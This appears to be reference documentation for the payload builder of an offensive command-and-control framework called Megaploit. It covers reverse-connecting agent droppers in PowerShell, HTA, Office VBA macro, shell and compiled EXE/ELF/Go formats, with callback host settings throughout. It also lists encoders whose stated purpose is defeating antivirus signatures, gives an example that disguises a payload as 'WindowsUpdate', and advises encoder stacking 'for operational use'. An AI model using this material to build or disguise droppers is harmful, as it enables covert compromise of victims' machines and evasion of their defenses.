# Payload Builder Reference

## Overview

The Megaploit payload builder generates agent droppers in multiple formats, with an optional encoder pipeline for evasion.

```
megaploit [1] » payload <format> [options]
```

---

## Output Formats

| Format | Platform | Description |
|---|---|---|
| `py` | Any (Python) | Raw Python agent source |
| `ps1` | Windows | PowerShell dropper — base64-decodes Python agent and runs via `pythonw.exe` |
| `hta` | Windows | HTML Application (.hta) — runs via `mshta.exe` |
| `vba` | Windows | VBA macro — paste into Office `AutoOpen` / `Document_Open` |
| `sh` | Linux/macOS | Bash/sh dropper — base64-decodes Python and runs via `nohup python3` |
| `bat` | Windows | Batch file dropper |
| `raw` | Any | Identical to `py` — for piping to another tool |
| `exe` | Windows | Compiled EXE via PyInstaller |
| `elf` | Linux | Compiled ELF via PyInstaller |
| `go_exe` | Windows | **NEW v3** — compiled EXE from Go agent source via `go build` |
| `go_elf` | Linux/macOS | **NEW v3** — compiled ELF from Go agent source via `go build` |
| `oneliner_py` | Any | Single `python3 -c "..."` command (gzip+base64) |
| `oneliner_ps1` | Windows | Single `powershell -c "..."` command (gzip+base64) |

---

## CLI Options

```
payload <format> [--out <file>] [--tls] [--encoder <name>]... [--upx]

--out / -o <file>      Write to file instead of printing to terminal
--tls                  Agent uses TLS when connecting back
--encoder / -e <name>  Apply a named encoder (can be repeated for chaining)
--upx                  UPX-compress binary after PyInstaller build (exe/elf only)
```

---

## Encoder Pipeline

Encoders are applied left to right. Binary-safe encoders (xor_rolling, rc4, b64gzip, rev, zlib_b64) transform raw bytes. Source-mutating encoders (comment_spam, varname_rand, ps1_concat) only make sense on text payloads.

### Available Encoders

#### `xor_rolling`
XOR-encodes payload with a 32-byte rolling key. Key is prepended as `[4B length][key][ciphertext]`. The key changes per build (random). Breaks static-string AV signatures.

#### `rc4`  
RC4 stream cipher with a random 16-byte key. Key prepended as `[16B key][ciphertext]`.

#### `b64gzip`
Gzip compress (level 9) then base64-encode. Significantly reduces size and changes byte distribution.

#### `rev`
Reverse the byte sequence. Trivial but defeats naive signature matching on fixed-offset patterns.

#### `zlib_b64`
Zlib compress (level 9) then base64-encode.

#### `rot13_src`
Apply ROT-13 to all printable ASCII characters. Breaks string-literal signatures.

#### `null_pad`
Insert a null byte after every real byte (doubles size). Breaks fixed-length signature matching.

#### `comment_spam`
Insert random inline comments at ~40% of source code lines. Makes every build unique.

```python
# Before:
x = 1
# After:
x = 1  # dYwqKcFm
```

#### `varname_rand`
Rename short Python variable names (1-3 chars appearing ≥2 times) to random 8-char identifiers.

```python
# Before:
s = socket.socket()
s.connect((h, p))
# After:
_xkqjybnd = socket.socket()
_xkqjybnd.connect((_mfrtvpqw, _qzsldnob))
```

#### `ps1_concat`
Split PowerShell string literals ≥4 chars into 3-char concat fragments:

```powershell
# Before:
$cmd = "python.exe"
# After:
$cmd = ("pyt" + "hon" + ".ex" + "e")
```

---

## PyInstaller Options (`exe` / `elf` formats)

```
payload exe --out agent.exe --upx

Internally runs:
  pyinstaller --onefile --noconsole
              --distpath <tmpdir>/dist
              --specpath <tmpdir>/spec
              --name <name>
              [--icon <icon>]
              [--upx-dir <upx-dir>]
              <src.py>
```

Requirements:
- `pyinstaller` must be installed: `pip install pyinstaller`
- For `--upx`: `upx` must be on PATH
- Build timeout: 300 seconds

---

## Go Agent Build (`go_exe` / `go_elf` formats) — NEW v3

```
payload go_exe --out agent.exe     # Windows EXE (GOOS=windows)
payload go_elf --out agent_linux   # Linux ELF  (GOOS=linux)
```

Requirements:
- `go` must be on PATH: install from https://go.dev/dl/
- Go agent source at `megaploit/agent/go_agent/`

**How it works:**

Config is injected at link time via `-ldflags`, overriding package-level variables in `main.go`:

```bash
go build \
  -ldflags="-s -w -X main.LHOST=10.0.0.1 -X main.PORT=4444 -X main.SECRET=<b64key>" \
  -o agent.exe .
```

No source patching is required. Cross-compilation works naturally:
- `go_exe` sets `GOOS=windows GOARCH=amd64`
- `go_elf` uses the default `GOOS` (linux) and `GOARCH` (amd64)

Build timeout: 120 seconds.

The Go agent features:
- AES-256-GCM encrypted transport — identical protocol to the Python agent
- HMAC-SHA256 challenge-response authentication
- Auto-reconnect with jitter
- No Python runtime required on the target
- Cross-platform: linux/amd64, windows/amd64, darwin/arm64, etc.

---

## Python API

```python
from megaploit.payload.builder import builder, BuildConfig, OutputFormat
from megaploit.payload.encoders import encode_pipeline, encoder_info

# Quick helper methods:
result = builder.build_ps1(lhost="10.0.0.1", lport=4444)
result = builder.build_exe(lhost="10.0.0.1", lport=4444, output_path="agent.exe")
result = builder.build_oneliner(lhost="10.0.0.1", lport=4444, ps1=True)

# Go agent:
from megaploit.payload.builder import BuildConfig, OutputFormat
cfg = BuildConfig(
    lhost       = "10.0.0.1",
    lport       = 4444,
    format      = OutputFormat.GO_EXE,
    secret_key  = b"...",
    output_path = "agent.exe",
)
result = builder.build(cfg)

# Full Python agent with encoding:
cfg = BuildConfig(
    lhost       = "10.0.0.1",
    lport       = 4444,
    format      = OutputFormat.PS1,
    use_tls     = True,
    secret_key  = b"...",
    output_path = "agent.ps1",
    encoders    = ["comment_spam", "b64gzip"],
    name        = "WindowsUpdate",
)
result = builder.build(cfg)

if result.ok:
    print(f"Built: {result.output_path}  sha256={result.sha256[:16]}...")
else:
    print(f"FAILED: {result.error}")

# Encoder pipeline standalone:
encoded = encode_pipeline(b"my data", ["xor_rolling", "b64gzip"])

# List available encoders:
for name, doc in encoder_info().items():
    print(f"  {name}: {doc}")
```

---

## `BuildResult` Fields

| Field | Type | Description |
|---|---|---|
| `ok` | bool | True if build succeeded |
| `format` | OutputFormat | The format that was built |
| `data` | bytes | Payload bytes (if output_path was empty) |
| `output_path` | str | Path to output file (if output_path was set) |
| `size` | int | Payload size in bytes |
| `sha256` | str | SHA-256 hex digest of the output |
| `error` | str | Error message if ok=False |
| `build_time_s` | float | Build duration in seconds |

---

## Security Notes

- The embedded agent source includes the HMAC key in base64. **Do not share generated payloads publicly.**
- `oneliner_*` formats are human-readable in base64 — gzip provides compression, not security.
- For operational use: combine `b64gzip` + `comment_spam` + `varname_rand` at minimum.
- Go agent binaries are stripped (`-s -w`) and have no embedded plaintext strings after link-time injection.
- EXE/ELF PyInstaller binaries are harder to analyse but significantly larger than Go binaries.
